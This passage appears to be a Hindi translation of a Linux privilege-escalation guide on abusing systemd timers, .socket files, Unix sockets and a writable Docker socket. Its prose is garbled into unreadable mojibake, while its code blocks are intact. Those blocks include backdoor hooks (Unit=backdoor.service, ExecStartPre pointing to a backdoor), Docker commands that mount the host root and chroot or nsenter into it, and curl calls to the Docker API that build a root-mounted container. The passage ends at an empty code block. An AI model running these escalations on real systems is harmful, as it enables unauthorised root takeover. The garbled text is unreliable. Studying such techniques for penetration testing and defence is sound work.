рдлрд┐рд░, **executable** рдмрдирд╛рдПрдВ рдЬрд┐рд╕рдХрд╛ **рдирд╛рдо рд░рд┐рд▓реЗрдЯрд┐рд╡ рдкрд╛рде рдмрд╛рдЗрдирд░реА рдХреЗ рдирд╛рдо рдХреЗ рд╕рдорд╛рди рд╣реЛ** рд╕рд┐рд╕реНрдЯрдордб рдкрд╛рде рдлреЛрд▓реНрдбрд░ рдореЗрдВ рдЬрд┐рд╕рдореЗрдВ рдЖрдк рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдЬрдм рд╕реЗрд╡рд╛ рд╕реЗ рд╡рдВрд▓рд░реЗрдмрд▓ рдХреНрд░рд┐рдпрд╛ (**рд╢реБрд░реВ**, **рд░реЛрдХреЗрдВ**, **рд░реАрд▓реЛрдб**) рдХреЛ рдирд┐рд╖реЗрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рд╛ рдЬрд╛рдП, рддреЛ рдЖрдкрдХрд╛ **рдмреИрдХрдбреЛрд░ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛** (рдЕрдирд╡рд┐рд╢реЗрд╖рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рд╛рдзрд╛рд░рдгрдд: рд╕реЗрд╡рд╛рдПрдВ рд╢реБрд░реВ/рд░реЛрдХрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ рд▓реЗрдХрд┐рди рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк `sudo -l` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред)

**`man systemd.service`** рдХреЗ рд╕рд╛рде рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдиреЗрдВред

## **рдЯрд╛рдЗрдорд░реНрд╕**

**рдЯрд╛рдЗрдорд░реНрд╕** systemd рдпреВрдирд┐рдЯ рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдирд╛рдо `**.timer**` рд╕реЗ рд╕рдорд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ рдЬреЛ `**.service**` рдлрд╝рд╛рдЗрд▓реЛрдВ рдпрд╛ рдШрдЯрдирд╛рдУрдВ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреА рд╣реИрдВред **рдЯрд╛рдЗрдорд░реНрд╕** рдХреНрд░реЙрди рдХреЗ рд╡рд┐рдХрд▓реНрдк рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдЙрдирдореЗрдВ рдХреИрд▓реЗрдВрдбрд░ рд╕рдордп рдШрдЯрдирд╛рдУрдВ рдФрд░ рдореЛрдиреЛрдЯреЛрдирд┐рдХ рд╕рдордп рдШрдЯрдирд╛рдУрдВ рдХреЗ рд▓рд┐рдП рд╕рд╣рд╛рдпрдХ рд╕рдорд░реНрдерди рд╣реИ рдФрд░ рдпреЗ рдЕрд╕рдорд╡рд░реНрддреА рд░реВрдк рд╕реЗ рдЪрд▓рд╛рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдк рд╕рднреА рдЯрд╛рдЗрдорд░реНрд╕ рдХреЛ рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
systemctl list-timers --all
```
### рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдЯрд╛рдЗрдорд░

рдпрджрд┐ рдЖрдк рдПрдХ рдЯрд╛рдЗрдорд░ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдЗрд╕реЗ рдХреБрдЫ systemd.unit рдХреЗ рдЕрд╕реНрддрд┐рддреНрд╡ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ (рдЬреИрд╕реЗ рдПрдХ `.service` рдпрд╛ рдПрдХ `.target`)
```bash
Unit=backdoor.service
```
рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ рдЖрдк рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЗрдХрд╛рдИ рдХреНрдпрд╛ рд╣реИ:

> рдпрд╣ рдЯрд╛рдЗрдорд░ рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рдкрд░ рд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрдХрд╛рдИред рддрд╛рд░реНрдХрд┐рдХ рдПрдХ рдЗрдХрд╛рдИ рдирд╛рдо рд╣реИ, рдЬрд┐рд╕рдХрд╛ рд╕реВрдлрд╝рд┐рдХреНрд╕ ".timer" рдирд╣реАрдВ рд╣реИред рдпрджрд┐ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдпрд╣ рдорд╛рди рдПрдХ рд╕реЗрд╡рд╛ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо рдЯрд╛рдЗрдорд░ рдЗрдХрд╛рдИ рдХреЗ рдирд╛рдо рдХреЗ рд╕рдорд╛рди рд╣реИ, рд╕реВрдлрд╝рд┐рдХреНрд╕ рдХреЛ рдЫреЛрдбрд╝рдХрд░ред (рдКрдкрд░ рджреЗрдЦреЗрдВред) рд╕реБрдЭрд╛рд╡ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рд╕рдХреНрд░рд┐рдп рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдЗрдХрд╛рдИ рдХрд╛ рдирд╛рдо рдФрд░ рдЯрд╛рдЗрдорд░ рдЗрдХрд╛рдИ рдХрд╛ рдЗрдХрд╛рдИ рдирд╛рдо рд╕рдорд╛рди рд╣реЛ, рд╕реВрдлрд╝рд┐рдХреНрд╕ рдХреЛ рдЫреЛрдбрд╝рдХрд░ред

рдЗрд╕рд▓рд┐рдП, рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдХрд░рдирд╛ рд╣реЛрдЧрд╛:

* рдХреБрдЫ рд╕рд┐рд╕реНрдЯрдордб рдЗрдХрд╛рдИ (рдЬреИрд╕реЗ `.service`) рдвреВрдВрдвреЗрдВ рдЬреЛ **рдПрдХ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдмрд╛рдЗрдирд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░ рд░рд╣рд╛ рд╣реИ
* рдХреБрдЫ рд╕рд┐рд╕реНрдЯрдордб рдЗрдХрд╛рдИ рдвреВрдВрдвреЗрдВ рдЬреЛ **рдПрдХ рд╕рд╛рдкреЗрдХреНрд╖ рдорд╛рд░реНрдЧ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░ рд░рд╣рд╛ рд╣реИ рдФрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ **рд╕рд┐рд╕реНрдЯрдордб рдкрд╛рде** рдкрд░ **рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдЕрдзрд┐рдХрд╛рд░** рд╣реИрдВ (рдЙрд╕ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП)

**рдЯрд╛рдЗрдорд░ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП `man systemd.timer` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред**

### **рдЯрд╛рдЗрдорд░ рд╕рдХреНрд░рд┐рдп рдХрд░рдирд╛**

рдЯрд╛рдЗрдорд░ рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рд░реВрдЯ рдЕрдзрд┐рдХрд╛рд░ рдЪрд╛рд╣рд┐рдП рдФрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer тЖТ /lib/systemd/system/backu2.timer.
```
рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ **рдЯрд╛рдЗрдорд░** рдХреЛ `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` рдкрд░ рдПрдХ symlink рдмрдирд╛рдХрд░ **рд╕рдХреНрд░рд┐рдп** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

## рд╕реЙрдХреЗрдЯреНрд╕

Unix рдбреЛрдореЗрди рд╕реЙрдХреЗрдЯреНрд╕ (UDS) рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд░реНрд╡рд░ рдореЙрдбрд▓ рдХреЗ рднреАрддрд░ рд╕рдорд╛рди рдпрд╛ рднрд┐рдиреНрди рдорд╢реАрдиреЛрдВ рдкрд░ **рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕рдВрдЪрд╛рд░** рдХреЛ рд╕рдВрднрд╛рд╡рд┐рдд рдмрдирд╛рддреЗ рд╣реИрдВред рдЗрдиреНрд╣реЗрдВ рдЕрдВрддрд░-рдХрдВрдкреНрдпреВрдЯрд░ рд╕рдВрдЪрд╛рд░ рдХреЗ рд▓рд┐рдП рдорд╛рдирдХ Unix рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдпреЗ `.socket` рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реЗрдЯрдЕрдк рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред

рд╕реЙрдХреЗрдЯреНрд╕ рдХреЛ `.socket` рдлрд╝рд╛рдЗрд▓реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**`man systemd.socket` рдХреЗ рд╕рд╛рде рд╕реЙрдХреЗрдЯреНрд╕ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдиреЗрдВред** рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЗ рднреАрддрд░, рдХрдИ рджрд┐рд▓рдЪрд╕реНрдк рдкреИрд░рд╛рдореАрдЯрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: рдпреЗ рд╡рд┐рдХрд▓реНрдк рдЕрд▓рдЧ-рдЕрд▓рдЧ рд╣реИрдВ рд▓реЗрдХрд┐рди рдПрдХ рд╕рд╛рд░рд╛рдВрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕реЙрдХреЗрдЯ рдкрд░ **рдХрд╣рд╛рдБ рд╕реБрдиреЗрдЧрд╛** рдЗрд╕реЗ рджрд░реНрд╢рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (AF\_UNIX рд╕реЙрдХреЗрдЯ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдкрде, рд╕реБрдирдиреЗ рдХреЗ рд▓рд┐рдП IPv4/6 рдФрд░/рдпрд╛ рдкреЛрд░реНрдЯ рдирдВрдмрд░, рдЖрджрд┐)ред
* `Accept`: рдПрдХ рдмреВрд▓рд┐рдпрди рддрд░реНрдХ рд▓реЗрддрд╛ рд╣реИред рдпрджрд┐ **рд╕рддреНрдп** рд╣реИ, рддреЛ рдкреНрд░рддреНрдпреЗрдХ рдЖрдиреЗ рд╡рд╛рд▓реА рдХрдиреЗрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдПрдХ **рд╕реЗрд╡рд╛ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдЙрддреНрдкрдиреНрди** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдХреЗрд╡рд▓ рдХрдиреЗрдХреНрд╢рди рд╕реЙрдХреЗрдЯ рдХреЛ рдЙрд╕реЗ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрджрд┐ **рдЭреВрдард╛** рд╣реИ, рддреЛ рд╕рднреА рд╕реБрдирдиреЗ рд╡рд╛рд▓реЗ рд╕реЙрдХреЗрдЯ рдЦреБрдж рдХреЛ **рд╢реБрд░реВ рдХреА рдЧрдИ рд╕реЗрд╡рд╛ рдЗрдХрд╛рдИ** рдХреЛ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ рдХреЗрд╡рд▓ рдПрдХ рд╕реЗрд╡рд╛ рдЗрдХрд╛рдИ рд╕рднреА рдХрдиреЗрдХреНрд╢рдиреЛрдВ рдХреЗ рд▓рд┐рдП рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдорд╛рдиреНрдпрддрд╛ рдбреЗрдЯрд╛рдЧреНрд░рд╛рдо рд╕реЙрдХреЗрдЯреНрд╕ рдФрд░ FIFOs рдХреЗ рд▓рд┐рдП рдПрдХ рд╣реА рд╕реЗрд╡рд╛ рдЗрдХрд╛рдИ рд╕рднреА рдЖрдиреЗ рд╡рд╛рд▓реЗ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рдЕрд╡рд╢реНрдп рд╣реА рд╕рдВрднрд╛рд▓рддреА рд╣реИред **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЭреВрдард╛** рд╣реИред рдкреНрд░рджрд░реНрд╢рди рдХрд╛рд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП, рдпрд╣ рд╕реБрдЭрд╛рд╡ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рдирдП рдбреЗрдорди рдХреЛ рдХреЗрд╡рд▓ рдЙрд╕ рддрд░реАрдХреЗ рдореЗрдВ рд▓рд┐рдЦрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬреЛ `Accept=no` рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рд╣реИред
* `ExecStartPre`, `ExecStartPost`: рдПрдХ рдпрд╛ рдПрдХ рд╕реЗ рдЕрдзрд┐рдХ рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рд▓реЗрддрд╛ рд╣реИ, рдЬреЛ рд╕реБрдирдиреЗ рд╡рд╛рд▓реЗ **рд╕реЙрдХреЗрдЯ**/FIFOs рдХреЛ **рдмрдирд╛рдП рдЬрд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ** рдпрд╛ **рдмрд╛рдж рдореЗрдВ** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдХрд╛ рдкрд╣рд▓рд╛ рдЯреЛрдХрди рдПрдХ рдкреВрд░реНрдг рдлрд╝рд╛рдЗрд▓ рдирд╛рдо рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдлрд┐рд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рддрд░реНрдХреЛрдВ рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред
* `ExecStopPre`, `ExecStopPost`: рдЕрддрд┐рд░рд┐рдХреНрдд **рдХрдорд╛рдВрдб** рдЬреЛ рд╕реБрдирдиреЗ рд╡рд╛рд▓реЗ **рд╕реЙрдХреЗрдЯ**/FIFOs рдХреЛ **рдмрдВрдж рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ** рдпрд╛ **рдмрд╛рдж рдореЗрдВ** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдФрд░ рд╣рдЯрд╛рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдХреНрд░рдорд╢рдГред
* `Service`: **рдЗрдирдХрдорд┐рдВрдЧ рдЯреНрд░реИрдлрд╝рд┐рдХ** рдкрд░ **рд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдирд╛рдорд┐рдд **рд╕реЗрд╡рд╛** рдЗрдХрд╛рдИ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рд╕реЗрдЯрд┐рдВрдЧ рдХреЛ рдХреЗрд╡рд▓ Accept=no рд╡рд╛рд▓реЗ рд╕реЙрдХреЗрдЯреНрд╕ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рд╣реИред рдЗрд╕рдХрд╛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╡рд╣ рд╕реЗрд╡рд╛ рд╣реИ рдЬреЛ рд╕реЙрдХреЗрдЯ рдХреЗ рдирд╛рдо рдХреЗ рд╕рдорд╛рди рд╣реИ (рд╕рдлрд╝рд┐рдХреНрд╕ рдХреЛ рдмрджрд▓рдХрд░)ред рдЕрдзрд┐рдХрд╛рдВрд╢ рдорд╛рдорд▓реЛрдВ рдореЗрдВ, рдЗрд╕ рд╡рд┐рдХрд▓реНрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред

### рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп .socket рдлрд╝рд╛рдЗрд▓реЗрдВ

рдпрджрд┐ рдЖрдкрдХреЛ рдПрдХ **рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп** `.socket` рдлрд╝рд╛рдЗрд▓ рдорд┐рд▓рддреА рд╣реИ рддреЛ рдЖрдк `[Socket]` рдЦрдВрдб рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреБрдЫ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ: `ExecStartPre=/home/kali/sys/backdoor` рдФрд░ рдмреИрдХрдбреЛрд░ рд╕реЙрдХреЗрдЯ рдмрдирд╛рдпрд╛ рдЬрд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛ред рдЗрд╕рд▓рд┐рдП, рдЖрдкрдХреЛ **рд╕рдВрднрд╛рд╡рд┐рдд рд╣реИ рдХрд┐ рдорд╢реАрди рдХреЛ рд░рд┐рдмреВрдЯ рд╣реЛрдиреЗ рддрдХ рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░рдиреА рдкрдбрд╝реЗрдЧреА**ред\
_рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдЙрд╕ рд╕реЙрдХреЗрдЯ рдлрд╝рд╛рдЗрд▓ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдпрд╛ рддреЛ рдмреИрдХрдбреЛрд░ рдирд╣реАрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛_

### рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рд╕реЙрдХреЗрдЯреНрд╕

рдпрджрд┐ рдЖрдк **рдХрд┐рд╕реА рднреА рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рд╕реЙрдХреЗрдЯ** рдХреА рдкрд╣рдЪрд╛рди рдХрд░рддреЗ рд╣реИрдВ (_рдЕрдм рд╣рдо Unix рд╕реЙрдХреЗрдЯреНрд╕ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдмрд╛рдд рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдФрд░ `.socket` рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдирд╣реАрдВ_), рддреЛ рдЖрдк рдЙрд╕ рд╕реЙрдХреЗрдЯ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╢рд╛рдпрдж рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдХрд╛ рд╢реЛрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### Unix рд╕реЙрдХреЗрдЯреНрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ
```bash
netstat -a -p --unix
```
### рдХрдЪреНрдЪреА рдХрдиреЗрдХреНрд╢рди
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**рд╢реЛрд╖рдг рдЙрджрд╛рд╣рд░рдг:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP рд╕реЙрдХреЗрдЯреНрд╕

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХреБрдЫ **HTTP** рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рд▓рд┐рдП рд╕реБрдирдиреЗ рд╡рд╛рд▓реЗ **рд╕реЙрдХреЗрдЯреНрд╕** рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ (_рдореИрдВ .socket рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдирд╣реАрдВ рдмрд╛рдд рдХрд░ рд░рд╣рд╛ рд╣реВрдБ рдмрд▓реНрдХрд┐ рдпреВрдирд┐рдХреНрд╕ рд╕реЙрдХреЗрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░рдиреЗ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ_). рдЖрдк рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рд╕рд╛рде рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
### рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдбреЙрдХрд░ рд╕реЙрдХреЗрдЯ

рдбреЙрдХрд░ рд╕реЙрдХреЗрдЯ, рдЬреЛ рдЕрдХреНрд╕рд░ `/var/run/docker.sock` рдкрд░ рдкрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдлрд╝рд╛рдЗрд▓ рд╣реИ рдЬрд┐рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рд░рдЦрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдЗрд╕реЗ `root` рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ `docker` рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдпреЛрдВ рджреНрд╡рд╛рд░рд╛ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред рдЗрд╕ рд╕реЙрдХреЗрдЯ рдХреЛ рд▓рд┐рдЦрдиреЗ рдХреА рдкрд╣реБрдВрдЪ рдХреЗ рдкрд╛рд╕ рд╣реЛрдиреЗ рд╕реЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ рд╣реЛ рд╕рдХрддреА рд╣реИред рдпрд╣рд╛рдБ рдЗрд╕рдХрд╛ рд╡рд┐рд╡рд░рдг рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд╡реИрдХрд▓реНрдкрд┐рдХ рд╡рд┐рдзрд┐рдпрд╛рдБ рдЕрдЧрд░ рдбреЙрдХрд░ CLI рдЙрдкрд▓рдмреНрдз рдирд╣реАрдВ рд╣реИред
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
### **рдбреЙрдХрд░ API рд╕реАрдзреЗ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛**

рдЙрди рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ рдбреЙрдХрд░ CLI рдЙрдкрд▓рдмреНрдз рдирд╣реАрдВ рд╣реИ, рдбреЙрдХрд░ API рдФрд░ `curl` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд┐рд░ рднреА рдбреЙрдХрд░ рд╕реЙрдХреЗрдЯ рдХреЛ рдореЛрдбрд╝рдирд╛ рд╕рдВрднрд╡ рд╣реИред

1.  **рдбреЙрдХрд░ рдЗрдореЗрдЬреЗрд╕ рдХреА рд╕реВрдЪреА рджреЗрдЦреЗрдВ:** рдЙрдкрд▓рдмреНрдз рдЗрдореЗрдЬреЗрд╕ рдХреА рд╕реВрдЪреА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```
2.  **рдПрдХ рдХрдВрдЯреЗрдирд░ рдмрдирд╛рдПрдВ:** рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдВ рддрд╛рдХрд┐ рдПрдХ рдХрдВрдЯреЗрдирд░ рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдЬреЛ рд╣реЛрд╕реНрдЯ рд╕рд┐рд╕реНрдЯрдо рдХреА рд░реВрдЯ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░рддрд╛ рд╣реИред

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

рдирдП рдмрдирд╛рдП рдЧрдП рдХрдВрдЯреЗрдирд░ рдХреЛ рд╢реБрд░реВ рдХрд░реЗрдВ:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
3.  **рдХрдВрдЯреЗрдирд░ рд╕реЗ рдЬреБрдбрд╝реЗрдВ:** `socat` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдЬреБрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рдЬрд┐рд╕рд╕реЗ рдЙрд╕рдореЗрдВ рдХрдорд╛рдВрдб рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди рд╕рдВрднрд╡ рд╣реЛред

```bash
